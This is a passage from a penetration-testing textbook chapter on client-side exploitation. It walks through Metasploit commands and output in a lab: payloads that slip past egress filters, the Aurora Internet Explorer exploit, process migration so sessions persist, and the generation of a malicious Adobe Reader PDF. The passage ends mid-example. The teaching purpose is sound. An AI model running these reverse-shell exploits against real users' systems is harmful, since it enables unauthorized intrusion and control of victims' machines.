<html><head></head><body><section class="chapter" epub:type="chapter" id="client-side_exploitation" title="Chapter&#xA0;10.&#xA0;Client-Side Exploitation"><div class="titlepage"><div><div><h2 class="title">Chapter 10. Client-Side Exploitation</h2></div></div></div><p>The vulnerabilities we’ve studied so far have been low-hanging fruit, and all have come up on real engagements. It’s common on penetration tests to find vulnerable services listening on ports, unchanged default passwords, misconfigured web servers, and so on.</p><p>However, clients who put a lot of time and effort into their security posture may be free from these kinds of vulnerabilities. They may have all security patches in place; they may periodically audit passwords and remove any that can be easily guessed or cracked. They may control user roles: Regular users may not have administrative rights on their workstations, and any software that is installed is investigated and maintained by the security staff. As a result, there may not be many services to even try to attack.</p><p>Yet, despite the deployment of the latest and greatest security technologies and the employment of crack security teams, high-profile companies (with potentially high payoffs for attackers) are still being breached. In this <a class="indexterm" id="iddle1406"/><a class="indexterm" id="iddle1643"/><a class="indexterm" id="iddle1701"/><a class="indexterm" id="iddle2158"/>chapter we’ll examine a few different kinds of attacks that don’t require direct network access. We’ll study attacks that target local software on a system—software that is not listening on a port.</p><p>Because we won’t attack a computer or listening port directly, and because we need to come up with another way to attack a device inside a corporate perimeter, we need to select our payload accordingly. Whereas a normal bind shell might work fine for systems directly exposed to the Internet or listening on a port on our local network, we will at the very least be limited to reverse connections here.</p><p>But first let’s dive a little deeper into the Metasploit payload system and check out some other payloads that may be useful to you.</p><div class="sect1" title="Bypassing Filters with Metasploit Payloads"><div class="titlepage"><div><div><h2 class="title" id="bypassing_filters_with_metasploit_payloa" style="clear: both">Bypassing Filters with Metasploit Payloads</h2></div></div></div><p>In previous chapters we discussed the Metasploit payload system, including single versus staged payloads and bind shells versus reverse shells. We also talked briefly about Metasploit’s Meterpreter payload (which we’ll discuss in depth in <a class="xref" href="ch13.xhtml" title="Chapter 13. Post Exploitation">Chapter 13</a>). When you use the command <code class="literal">show payloads</code> on a module, you may see several payloads that may be new to you. We’ll look at a few in this section that can be used to bypass filtering technologies you may encounter on your pentests.</p><div class="sect2" title="All Ports"><div class="titlepage"><div><div><h3 class="title" id="all_ports">All Ports</h3></div></div></div><p>Our network is set up such that our attack and target virtual machines are on the same network with no firewalls or other filters blocking communications. However, in your pentesting career, you may encounter clients with all sorts of filtering setups. Even a reverse connection may not be able to get through the filters and connect back to your attack machine on just any port. For example, a client network may not allow traffic to leave the network on port 4444, the default for Metasploit <span class="emphasis"><em>reverse_tcp</em></span> payloads. It may allow traffic out only on specific ports, such as 80 or 443 for web traffic.</p><p>If we know which ports are allowed through the filter, we can set the <code class="literal">LPORT</code> option to the relevant port. The Metasploit <span class="emphasis"><em>reverse_tcp_allports</em></span> payloads can help us find a port to connect to. As the name suggests, this payload communication method will try all ports until it finds a successful connection back to Metasploit.</p><p>Let’s test this functionality with the <span class="emphasis"><em>windows/shell/reverse_tcp_allports</em></span> payload, as shown in <a class="xref" href="ch10.xhtml#windowssolidusshellsolidusreverseundersc" title="Example 10-1. Windows/shell/reverse_tcp_allports payload">Example 10-1</a>. We are using the MS08-067 exploit against Windows XP.</p><div class="example"><a id="windowssolidusshellsolidusreverseundersc"/><div class="example-title">Example 10-1. Windows/shell/reverse_tcp_allports payload</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>set payload windows/shell/reverse_tcp_allports</strong></span>&#13;
payload =&gt; windows/shell/reverse_tcp_allports&#13;
msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>show options</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
Payload options (windows/shell/reverse_tcp_allports):&#13;
&#13;
   Name      Current Setting  Required  Description&#13;
   ----      ---------------  --------  -----------&#13;
   EXITFUNC  thread           yes       Exit technique: seh, thread, process, none&#13;
   LHOST     192.168.20.9     yes       The listen address&#13;
  ❶LPORT     1                yes       The starting port number to connect back on&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:1&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
[*] Sending encoded stage (267 bytes) to 192.168.20.10&#13;
[*] Command shell session 5 opened (192.168.20.9:1 -&gt; 192.168.20.10:1100) at 2015-05-14&#13;
22:13:20 -0400 ❷</pre></div></div><p><a class="indexterm" id="iddle1483"/><a class="indexterm" id="iddle1486"/>Here, the <code class="literal">LPORT</code> ❶ option specifies the first port to try. If that port doesn’t work, the payload will try each subsequent port until the connection succeeds. If the payload reaches 65535 without success, it starts trying again at port 1 and runs infinitely.</p><p>Because there is no filter blocking our traffic, the first port Metasploit tries, port 1, creates a successful connection, as shown at ❷. Though this payload will work in many cases, some filtering technologies will be able to stop it regardless of the port it tries to connect to. One downside to this payload is that it may run for a long time in an attempt to find an unfiltered port. If a user sees the application hanging, he or she may close it before the payload is successful.</p></div><div class="sect2" title="HTTP and HTTPS Payloads"><div class="titlepage"><div><div><h3 class="title" id="http_and_https_payloads">HTTP and HTTPS Payloads</h3></div></div></div><p>While some filters may allow all traffic out on certain ports, the most advanced filtering systems use content inspection to screen for legitimate protocol-specific traffic. This can pose a problem for our payloads. Even though our Meterpreter payload communication is encrypted—the content inspection won’t be able to say, “That’s Metasploit, go away!”—the filter will be able to tell that the traffic going out on port 80 doesn’t meet the HTTP specification.</p><p>To address this challenge, the developers of Metasploit created HTTP and HTTPS payloads. These payloads follow the HTTP and HTTPS specifications so that even content-inspection filters will be convinced that our traffic is legitimate. Also, these payloads are packet based, rather than stream based like the TCP payloads. That means they aren’t limited to a specific connection. If you lose network communication briefly and lose all your Metasploit sessions, HTTP and HTTPS sessions can recover and reconnect. (We’ll see an example using these payloads in <a class="xref" href="ch10.xhtml#java_vulnerability" title="Java Vulnerability">Java Vulnerability</a>.)</p><p><a class="indexterm" id="iddle1183"/><a class="indexterm" id="iddle1365"/><a class="indexterm" id="iddle2076"/>Though HTTP and HTTPS payloads will get you through most filtering technologies, you may find yourself in an even more complex filtering situation. For example, I tested one client where only the Internet Explorer process, when started by a domain-authenticated user, could reach the Internet. Employees could browse the Internet to perform their business, but they were somewhat limited. For instance, they couldn’t use an instant messenger client. While this probably annoyed some employees, it was a good idea for security reasons. Even if we had been able to successfully exploit something, even HTTP and HTTPS payloads could not get out to the Internet. (In <a class="xref" href="ch10.xhtml#browser_exploitation" title="Browser Exploitation">Browser Exploitation</a>, we’ll look at some attack methods that would allow us to exploit the Internet Explorer process when a legitimate domain user is logged in and then connect to the outside world.)</p><p>Meterpreter HTTP and Meterpreter HTTPS use the proxy settings of Internet Explorer to navigate any proxies necessary to call out to the Internet. For this reason, if your target process is running as the <span class="emphasis"><em>System</em></span> user, these proxy settings may not be defined, and these payloads may fail.</p><div class="note" title="Note"><h3 class="title"><a id="ch10note01"/>Note</h3><p>There is also a Meterpreter payload, reverse_https_proxy, that allows the attacker to manually add in any necessary proxy settings.</p></div></div></div><div class="sect1" title="Client-Side Attacks"><div class="titlepage"><div><div><h2 class="title" id="client-side_attacks" style="clear: both">Client-Side Attacks</h2></div></div></div><p>Now let’s turn our attention to running client-side attacks. Instead of directly attacking a service listening on a port, we’ll create a variety of malicious files that, when opened in vulnerable software on the target machine, will result in a compromise.</p><p>So far all of our attacks have involved some sort of service listening on a port, be it a web server, FTP server, SMB server, or otherwise. When we began our pentest, one of the first things we did was port scan our targets to see which services were listening. When we start a pentest, the potential vulnerabilities are practically limitless.</p><p>As we begin running tools, performing manual analysis, and researching, the exploitation possibilities gradually decrease until we’re left with a limited number of issues on the target systems. Those issues have been server-side issues—services listening on ports. What we are missing is any potentially vulnerable software that is not listening on a port—client-side software.</p><p>Software like web browsers, document viewers, music players, and so on are subject to the same sort of issues as web servers, mail servers, and every other network-based program.</p><p><a class="indexterm" id="iddle1134"/><a class="indexterm" id="iddle1565"/><a class="indexterm" id="iddle1666"/><a class="indexterm" id="iddle1744"/>Of course, because client-side software isn’t listening on the network, we can’t directly attack it, but the general principle is the same. If we can send unexpected input to a program to trigger a vulnerability, we can hijack execution, just as we exploited server-side programs in <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a>. Because we can’t send input to client-side programs directly over the network, we must entice a user to open a malicious file.</p><p>As security is taken more seriously and server-side vulnerabilities become more difficult to find from an Internet-facing perspective, client-side exploitation is becoming key to gaining access to even carefully protected internal networks. Client-side attacks are ideal for assets such as workstations or mobile devices that lack an Internet-facing IP address. Though from the perspective of the Internet we can’t directly access those systems, they can typically call out to the Internet, or to a pentester-controlled system, if we can hijack execution.</p><p>Unfortunately, the success of client-side attacks relies on somehow making sure that our exploit is downloaded and opened in a vulnerable product. In the next chapter, we’ll look at some techniques to lure users into opening malicious files; for now we’ll look at some client-side exploits, beginning with what must be the most popular target for client-side exploitation: web browsers.</p><div class="sect2" title="Browser Exploitation"><div class="titlepage"><div><div><h3 class="title" id="browser_exploitation">Browser Exploitation</h3></div></div></div><p>Web browsers are made up of code to render web pages. Just as we can send malformed input to server software, if we open a web page with malicious code to trigger a security issue, we can potentially hijack execution in the browser and execute a payload. Though the delivery is a bit different, the fundamental concept is the same. All of the most common browsers have been subject to security issues—Internet Explorer, Firefox, and even Mobile Safari.</p><div class="sidebar"><a id="iphone_jailbreaking_via_browser_exploita"/><div class="sidebar-title">iPhone Jailbreaking via Browser Exploitation</div><p>In the past, browser exploitation has been instrumental in iPhone jailbreaking. While later versions of iOS implement a security feature called <span class="emphasis"><em>mandatory code signing</em></span>, which requires that all executed code be approved by Apple, Mobile Safari (the web browser on the iPhone) gets a pass because to render web pages, it must be able to run unsigned code. Apple can’t go through all the pages on the Internet and sign everything that doesn’t contain malicious code. And if the iPhone can’t view web pages, everyone will just go buy an Android phone—the last thing Apple wants. When iOS 4 renders PDF documents in Mobile Safari, one of the fonts includes a security vulnerability. This client-side attack allows jailbreakers to gain a foothold on iPhones just by tricking a user into opening a malicious link in the browser.</p></div><p><a class="indexterm" id="iddle1082"/><a class="indexterm" id="iddle1552"/><a class="indexterm" id="iddle2214"/><a class="indexterm" id="iddle2548"/>Let’s consider a famous vulnerability in Internet Explorer. The Aurora exploit was used in 2010 against major companies such as Google, Adobe, and Yahoo!. At the time of the Aurora attacks, Internet Explorer contained a <span class="emphasis"><em>zero-day vulnerability</em></span>—that is, a vulnerability that had not yet been patched. (Even a fully updated version of Internet Explorer could be compromised if a user could be tricked into opening a malicious web page, triggering the vulnerability.)</p><p>Microsoft has released patches for Internet Explorer, but as with other security patches, users sometimes overlook updating their browsers, and the version of Internet Explorer installed on the Windows XP target doesn’t have the necessary security patch to protect against the Aurora exploit.</p><p>We’ll use Metasploit to take control of a target machine by attacking a vulnerable browser using the Aurora Metasploit module, <span class="emphasis"><em>exploit/windows/browser/ms10_002_aurora</em></span>, shown in <a class="xref" href="ch10.xhtml#internet_explorer_aurora_metasploit_modu" title="Example 10-2. Internet Explorer Aurora Metasploit module">Example 10-2</a>.</p><div class="note" title="Note"><h3 class="title"><a id="ch10note02"/>Note</h3><p>Client-side Metasploit modules are fundamentally the same as the server-side modules we have used so far, except that the options are a bit different: Instead of sending exploits to a remote host on the network, we set up a server and wait for a browser to access our page.</p></div><div class="example"><a id="internet_explorer_aurora_metasploit_modu"/><div class="example-title">Example 10-2. Internet Explorer Aurora Metasploit module</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use exploit/windows/browser/ms10_002_aurora</strong></span>&#13;
msf  exploit(ms10_002_aurora) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/windows/browser/ms10_002_aurora):&#13;
&#13;
   Name        Current Setting  Required  Description&#13;
   ----        ---------------  --------  -----------&#13;
  ❶SRVHOST     0.0.0.0          yes       The local host to listen on. This must be an address&#13;
                                            on the local machine or 0.0.0.0&#13;
  ❷SRVPORT     8080             yes       The local port to listen on.&#13;
  ❸SSL         false            no        Negotiate SSL for incoming connections&#13;
   SSLCert                      no        Path to a custom SSL certificate (default is randomly&#13;
                                            generated)&#13;
   SSLVersion  SSL3             no        Specify the version of SSL that should be used&#13;
                                            (accepted: SSL2, SSL3, TLS1)&#13;
  ❹URIPATH                      no        The URI to use for this exploit (default is random)&#13;
&#13;
&#13;
Exploit target:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
  ❺0   Automatic</pre></div></div><p>Notice in the options for the module that instead of <code class="literal">RHOST</code> we see the <code class="literal">SRVHOST</code> ❶ option. This is the local IP address for the server. By default this address is set to 0.0.0.0 to listen on all addresses on the local system. The <a class="indexterm" id="iddle2332"/>default port to listen on, the <code class="literal">SRVPORT</code> ❷ option, is 8080. You can change this port number to 80 (the default port for web servers) as long as no other program is using the port. You can even use an SSL connection ❸.</p><p>If we set the <code class="literal">URIPATH</code> ❹ option, we can specify a specific URL for the malicious page. If we don’t set anything here, a random URL will be used. Because the exploitation will take place entirely inside the browser, our exploit will work regardless of the version of Windows running ❺, as long as Internet Explorer is subject to the Aurora vulnerability.</p><p>Next we set the module options for our environment. The payloads for this module are the same as the Windows payloads we’ve already seen. Exploiting the browser is no different from exploiting any other program on the system, and we can run the same shellcode. We’ll use the <span class="emphasis"><em>windows/meterpreter/reverse_tcp</em></span> payload for this example to illustrate some client-side attack concepts, as shown in <a class="xref" href="ch10.xhtml#setting_options_and_launching_the_aurora" title="Example 10-3. Setting options and launching the Aurora module">Example 10-3</a>.</p><div class="note" title="Note"><h3 class="title"><a id="ch10note03"/>Note</h3><p>Make sure the apache2 web server is not running on port 80 with <span class="bolditalic"><code class="literal">service apache2 stop</code></span>.</p></div><div class="example"><a id="setting_options_and_launching_the_aurora"/><div class="example-title">Example 10-3. Setting options and launching the Aurora module</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms10_002_aurora) &gt; <span class="strong"><strong>set SRVHOST 192.168.20.9</strong></span>&#13;
SRVHOST =&gt; 192.168.20.9&#13;
msf  exploit(ms10_002_aurora) &gt; <span class="strong"><strong>set SRVPORT 80</strong></span>&#13;
SRVPORT =&gt; 80&#13;
msf  exploit(ms10_002_aurora) &gt; <span class="strong"><strong>set URIPATH aurora</strong></span>&#13;
URIPATH =&gt; <span class="strong"><strong>aurora</strong></span>&#13;
msf  exploit(ms10_002_aurora) &gt; <span class="strong"><strong>set payload windows/meterpreter/reverse_tcp</strong></span>&#13;
payload =&gt; windows/meterpreter/reverse_tcp&#13;
msf  exploit(ms10_002_aurora) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
LHOST =&gt; 192.168.20.9&#13;
msf  exploit(ms10_002_aurora) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
[*] Exploit running as background job.&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:4444 ❶&#13;
[*] Using URL: http://192.168.20.9:80/aurora ❷&#13;
[*] Server started.</pre></div></div><p>As you can see in <a class="xref" href="ch10.xhtml#setting_options_and_launching_the_aurora" title="Example 10-3. Setting options and launching the Aurora module">Example 10-3</a>, once we’ve set the options and run the module, a web server is started in the background on the selected <code class="literal">SRVPORT</code> at the selected <code class="literal">URIPATH</code> as shown at ❷. Additionally, a handler is set up for the selected payload ❶.</p><p>Now we’ll use Internet Explorer on the Windows XP target to browse to the malicious site. In Metasploit you should see that the page has been served and is attempting to exploit the vulnerability, as shown in <a class="xref" href="ch10.xhtml#receiving_a_client-side_session" title="Example 10-4. Receiving a client-side session">Example 10-4</a>. Although our Windows XP browser is vulnerable, it may take a couple tries to exploit the browser successfully.</p><p>Exploiting the Aurora vulnerability is not as reliable as exploiting the other vulnerabilities we’ve discussed so far in this book. If Internet Explorer crashes, but you do not receive a session, try browsing to the exploit page again.</p><div class="example"><a id="receiving_a_client-side_session"/><div class="example-title">Example 10-4. Receiving a client-side session</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms10_002_aurora) &gt; [*] 192.168.20.10      ms10_002_aurora -&#13;
Sending Internet Explorer "Aurora" Memory Corruption&#13;
[*] Sending stage (752128 bytes) to 192.168.20.10&#13;
[*] Meterpreter session 1 opened (192.168.20.9:4444 -&gt; 192.168.20.10:1376) at&#13;
2015-05-05 20:23:25 -0400 ❶</pre></div></div><p><a class="indexterm" id="iddle1093"/><a class="indexterm" id="iddle1602"/><a class="indexterm" id="iddle1686"/><a class="indexterm" id="iddle1716"/>Though this exploit may not work every time, the target browser is vulnerable and a couple of tries should do it. If the exploit succeeds, you will receive a session, as shown at ❶. We are not automatically dropped into the session. Use <span class="strong"><strong><code class="literal">sessions -i</code></strong></span> <span class="bolditalic"><code class="literal">&lt;session id&gt;</code></span> to interact with the Meterpreter session.</p><p>Though we have successfully exploited the browser and gained a foothold on the target system, our challenges are not over. If you look back at the Windows XP machine and try to continue using Internet Explorer, you’ll find that it’s no longer functioning. The exploitation involved in getting our session has made the browser unusable. The problem for us is that users who have been tricked into visiting our malicious site will naturally want to continue using their browsers. They may force-quit the browser, or the browser may crash on its own due to its unstable state. When the browser closes, we lose our Meterpreter session.</p><a id="pro_id00133"/><pre class="programlisting">msf  exploit(ms10_002_aurora) &gt; [*] 192.168.20.10 - Meterpreter session 1 closed.  Reason: Died❶</pre><p>Our Meterpreter payload resides entirely inside the memory of the exploited process. If the browser dies or is closed by the user, our session also dies, as you can see at ❶. We can lose our foothold on the system just as quickly as we gained it.</p><p>We need a way to keep our Meterpreter session alive, even if the exploited process—in this case, the Internet Explorer browser—dies. But first, we need to stop our Metasploit web server so we can make some changes to the malicious page to fix this problem, as shown in <a class="xref" href="ch10.xhtml#killing_a_background_job_in_metasploit" title="Example 10-5. Killing a background job in Metasploit">Example 10-5</a>.</p><div class="example"><a id="killing_a_background_job_in_metasploit"/><div class="example-title">Example 10-5. Killing a background job in Metasploit</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms10_002_aurora) &gt; <span class="strong"><strong>jobs</strong></span>❶&#13;
&#13;
Jobs&#13;
====&#13;
&#13;
  Id  Name&#13;
  --  ----&#13;
  0   Exploit: windows/browser/ms10_002_aurora&#13;
&#13;
msf  exploit(ms10_002_aurora) &gt; <span class="strong"><strong>kill 0</strong></span>❷&#13;
Stopping job: 0...&#13;
&#13;
[*] Server stopped.</pre></div></div><p>We can see everything running in the background in Metasploit by entering <span class="strong"><strong><code class="literal">jobs</code></strong></span> ❶. To stop a job running in the background, enter <span class="strong"><strong><code class="literal">kill &lt;</code></strong></span><span class="bolditalic"><code class="literal">job number</code></span><span class="strong"><strong><code class="literal">&gt;</code></strong></span> ❷.</p><p><a class="indexterm" id="iddle1689"/><a class="indexterm" id="iddle1718"/><a class="indexterm" id="iddle2110"/><a class="indexterm" id="iddle2151"/>Because Meterpreter lives entirely inside the memory of the exploited process and that process is doomed to die, we need some way to move our session out of the Internet Explorer process and into one that is more likely to stick around.</p><div class="sect3" title="Running Scripts in a Meterpreter Session"><div class="titlepage"><div><div><h4 class="title" id="running_scripts_in_a_meterpreter_session">Running Scripts in a Meterpreter Session</h4></div></div></div><p>Unlike network attacks, where we will see a session right away if our attack succeeds, when performing client-side attacks, we must wait until a user accesses our malicious page. Even if we find a way to move Meterpreter into another process, sessions could come in at any time. We can’t be distracted at any point during our pentest or we risk losing a session. It would be ideal if we could automatically run commands in our Meterpreter session so that we don’t have to sit idly, waiting for a browser to access our malicious server.</p><p>Meterpreter scripts that can be run in an open session can be found at <span class="emphasis"><em>/usr/share/metasploit-framework/scripts/meterpreter</em></span> in Kali. We’ll look at more examples of Meterpreter scripts in <a class="xref" href="ch13.xhtml" title="Chapter 13. Post Exploitation">Chapter 13</a>, but for now let’s look at one specific Meterpreter script that will work well with our current scenario. The script <span class="emphasis"><em>migrate.rb</em></span> allows us to move Meterpreter from the memory of one process to another, which is exactly what we need here. To run a Meterpreter script inside an active Meterpreter session, enter <span class="strong"><strong><code class="literal">run &lt;</code></strong></span><span class="bolditalic"><code class="literal">script name</code></span><span class="strong"><strong><code class="literal">&gt;</code></strong></span>, as shown in <a class="xref" href="ch10.xhtml#running_a_meterpreter_script" title="Example 10-6. Running a Meterpreter script">Example 10-6</a>. You may be presented with help information about how to use the script correctly, as we are shown here.</p><div class="example"><a id="running_a_meterpreter_script"/><div class="example-title">Example 10-6. Running a Meterpreter script</div><div class="example-contents"><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>run migrate</strong></span>&#13;
&#13;
OPTIONS:&#13;
&#13;
    -f        Launch a process and migrate into the new process ❶&#13;
    -h        Help menu.&#13;
    -k        Kill original process.&#13;
    -n &lt;opt&gt;  Migrate into the first process with this executable name (explorer.exe) ❷&#13;
    -p &lt;opt&gt;  PID to migrate to. ❸</pre></div></div><p>When we attempt to run the <span class="emphasis"><em>migrate</em></span> script, we see a few options. We can launch a new process and migrate into that process, as shown at ❶; migrate into a process with a given name ❷; or choose the process by process ID, as shown at ❸.</p></div><div class="sect3" title="Advanced Parameters"><div class="titlepage"><div><div><h4 class="title" id="advanced_parameters">Advanced Parameters</h4></div></div></div><p>In addition to the module and payload options, Metasploit modules have advanced parameters. We can see the available advanced parameters with the command <code class="literal">show advanced</code>, as shown in <a class="xref" href="ch10.xhtml#metasploit_advanced_parameters" title="Example 10-7. Metasploit advanced parameters">Example 10-7</a>.</p><div class="example"><a id="metasploit_advanced_parameters"/><div class="example-title">Example 10-7. Metasploit advanced parameters</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms10_002_aurora) &gt; <span class="strong"><strong>show advanced</strong></span>&#13;
&#13;
Module advanced options:&#13;
&#13;
   Name           : ContextInformationFile&#13;
   Current Setting:&#13;
   Description    : The information file that contains context information&#13;
&#13;
   --<span class="emphasis"><em>snip</em></span>--&#13;
   Name           : AutoRunScript❶&#13;
   Current Setting:&#13;
   Description    : A script to run automatically on session creation.&#13;
&#13;
   --<span class="emphasis"><em>snip</em></span>--&#13;
   Name           : WORKSPACE&#13;
   Current Setting:&#13;
   Description    : Specify the workspace for this module</pre></div></div><p><a class="indexterm" id="iddle1087"/>One of the advanced settings for our chosen payload is <code class="literal">AutoRunScript</code> ❶. When set, this setting will allow us to automatically run a Meterpreter script when a session opens.</p><p>We can set this parameter to automatically run the <span class="emphasis"><em>migrate</em></span> script when a Meterpreter session opens. This way, when the browser dies, as long as the <span class="emphasis"><em>migrate</em></span> script has finished, our session will be safe from the crash. Additionally, by running the script automatically, we can migrate whenever a user accesses the malicious page, regardless of whether you have your eyes on Msfconsole when the session comes in, as shown in <a class="xref" href="ch10.xhtml#setting_the_autorunscript_parameter" title="Example 10-8. Setting the AutoRunScript parameter">Example 10-8</a>.</p><div class="example"><a id="setting_the_autorunscript_parameter"/><div class="example-title">Example 10-8. Setting the <code class="literal">AutoRunScript</code> parameter</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms10_002_aurora) &gt; <span class="strong"><strong>set AutoRunScript migrate -f</strong></span>❶&#13;
AutoRunScript =&gt; migrate -f&#13;
msf  exploit(ms10_002_aurora) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
[*] Exploit running as background job.&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] Using URL: http://192.168.20.9:80/aurora&#13;
[*] Server started.</pre></div></div><p>To set advanced parameters, use the syntax <code class="literal">set &lt;</code><span class="emphasis"><em><code class="literal">parameter to set</code></em></span><code class="literal">&gt; &lt;</code><span class="emphasis"><em><code class="literal">value</code></em></span><code class="literal">&gt;</code> (the same as setting regular options). For example, in <a class="xref" href="ch10.xhtml#setting_the_autorunscript_parameter" title="Example 10-8. Setting the AutoRunScript parameter">Example 10-8</a>, we tell the <span class="emphasis"><em>migrate</em></span> script to spawn a new process to migrate into with the <code class="literal">-f</code> flag ❶, and then we start the malicious server again.</p><p>Now browse to the malicious page from the Windows XP target again (see <a class="xref" href="ch10.xhtml#automatically_migrating" title="Example 10-9. Automatically migrating">Example 10-9</a>).</p><div class="example"><a id="automatically_migrating"/><div class="example-title">Example 10-9. Automatically migrating</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms10_002_aurora) &gt; [*] 192.168.20.10       ms10_002_aurora - Sending Internet Explorer "Aurora" Memory Corruption&#13;
[*] Sending stage (752128 bytes) to 192.168.20.10&#13;
[*] Meterpreter session 2 opened (192.168.20.9:4444 -&gt; 192.168.20.10:1422) at 2015-05-05 20:26:15 -0400&#13;
[*] Session ID 2 (192.168.20.9:4444 -&gt; 192.168.20.10:1422) processing AutoRunScript 'migrate -f' ❶&#13;
[*] Current server process: iexplore.exe (3476)&#13;
[*] Spawning notepad.exe process to migrate to&#13;
[+] Migrating to 484&#13;
[+] Successfully migrated to process ❷</pre></div></div><p><a class="indexterm" id="iddle1023"/><a class="indexterm" id="iddle1240"/><a class="indexterm" id="iddle1768"/><a class="indexterm" id="iddle1922"/><a class="indexterm" id="iddle1959"/>This time we get a session saying that the <code class="literal">AutoRunScript</code> parameter is processed automatically ❶. The <span class="emphasis"><em>migrate</em></span> script spawns a <span class="emphasis"><em>notepad.exe</em></span> process and moves into it ❷. When Internet Explorer dies, our session remains alive.</p><p>Though automatically migrating is a good idea when using a browser exploit, it still takes a few seconds for the migration to happen—seconds during which the user could close the browser and kill our session. Fortunately, the advanced Meterpreter option <code class="literal">PrependMigrate</code>, shown here, will migrate even faster, before the payload is run.</p><a id="pro_id00134"/><pre class="programlisting">Name           : PrependMigrate&#13;
Current Setting: false&#13;
Description    : Spawns and runs shellcode in new process</pre><p>You can set this option to <code class="literal">true</code> as an alternative to the <code class="literal">AutoRunScript</code> we used earlier.</p><p>This has been just one example of a browser exploit. Metasploit has other modules for exploiting vulnerabilities in Internet Explorer as well as other popular web browsers. As more organizations have hardened their external security posture, browser exploitation has given over the keys to the kingdom in many pentests as well as attacks.</p><div class="note" title="Note"><h3 class="title"><a id="ch10note04"/>Note</h3><p>The Aurora vulnerability was patched in 2010, but users and organizations are bad at keeping their browsers up to date, so this exploit still finds targets today. Additionally, though new remote exploits for operating systems are rare, major browsers such as Internet Explorer fall victim to new client-side attacks on a regular basis. Use Msfupdate as discussed in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a> to get the latest modules for new vulnerabilities, some of which may not even be patched by the vendor at the time of the module’s release. Note that running Msfupdate may affect how Metasploit works, which may make it more difficult to follow along with the book. Therefore, you may not want to update Metasploit until after you have read through the book.</p></div><p>Now let’s look at some other client-side software that can be exploited to gain command execution on a target system.</p></div></div><div class="sect2" title="PDF Exploits"><div class="titlepage"><div><div><h3 class="title" id="pdf_exploits">PDF Exploits</h3></div></div></div><p>Portable Document Format (PDF) software can also be exploited. If a user can be enticed to open a malicious PDF in a vulnerable viewer, the program can be exploited.</p><p>The most popular PDF viewer for Windows systems is Adobe Reader. Like browsers, Adobe Reader has a history littered with security holes. Also like browsers, even when a patch-management process is in place, regularly updating the underlying operating system, PDF software is often forgotten, and remains at an older, vulnerable version.</p><div class="sect3" title="Exploiting a PDF Vulnerability"><div class="titlepage"><div><div><h4 class="title" id="exploiting_a_pdf_vulnerability">Exploiting a PDF Vulnerability</h4></div></div></div><p><a class="indexterm" id="iddle1385"/>Our Windows XP target has an outdated version of Adobe Reader 8.1.2 installed that is subject to CVE-2008-2992, a stack-based buffer overflow. The corresponding Metasploit module is <span class="emphasis"><em>exploit/windows/fileformat/adobe_utilprintf</em></span>.</p><p>The options for this module are a bit different than anything we’ve seen thus far, as shown in <a class="xref" href="ch10.xhtml#metasploit_pdf_exploit" title="Example 10-10. A Metasploit PDF exploit">Example 10-10</a>. This is a client-side attack, so there is no <code class="literal">RHOST</code> option, but unlike our browser attack, there are also no <code class="literal">SRVHOST</code> or <code class="literal">SRVPORT</code> options. This module simply creates a malicious PDF; hosting it for delivery and setting up a payload handler is up to us. Of course, we have all the skills necessary to perform both these tasks easily.</p><div class="example"><a id="metasploit_pdf_exploit"/><div class="example-title">Example 10-10. A Metasploit PDF exploit</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use exploit/windows/fileformat/adobe_utilprintf</strong></span>&#13;
msf  exploit(adobe_utilprintf) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/windows/fileformat/adobe_utilprintf):&#13;
&#13;
   Name      Current Setting  Required  Description&#13;
   ----      ---------------  --------  -----------&#13;
  ❶FILENAME  msf.pdf          yes       The file name.&#13;
&#13;
&#13;
Exploit target:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
  ❷0   Adobe Reader v8.1.2 (Windows XP SP3 English)&#13;
&#13;
&#13;
msf  exploit(adobe_utilprintf) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Creating 'msf.pdf' file...&#13;
[+] msf.pdf stored at /root/.msf4/local/msf.pdf ❸</pre></div></div><p>As you can see, the only option for the PDF exploit is the name of the malicious file to be generated ❶. We can leave the default, <span class="emphasis"><em>msf.pdf</em></span>. For this example, we’ll have Metasploit use the default payload, <span class="emphasis"><em>windows/meterpreter/reverse_tcp</em></span> on port 4444. When we enter <span class="strong"><strong><code class="literal">exploit</code></strong></span>, Metasploit generates a PDF that will exploit this vulnerability in a vulnerable version of Adobe Reader on Windows XP SP3 English ❷. The malicious PDF is stored as <span class="emphasis"><em>/root/.msf4/local/msf.pdf</em></span> ❸.</p><p>Now we need to serve the PDF and set up a handler for the payload, as shown in <a class="xref" href="ch10.xhtml#serving_the_malicious_pdf_and_using_a_ha" title="Example 10-11. Serving the malicious PDF and using a handler">Example 10-11</a>.</p><div class="example"><a id="serving_the_malicious_pdf_and_using_a_ha"/><div class="example-title">Example 10-11. Serving the malicious PDF and using a handler</div><div class="example-contents"><pre class="programlisting">msf  exploit(adobe_utilprintf) &gt; <span class="strong"><strong>cp /root/.msf4/local/msf.pdf /var/www</strong></span>&#13;
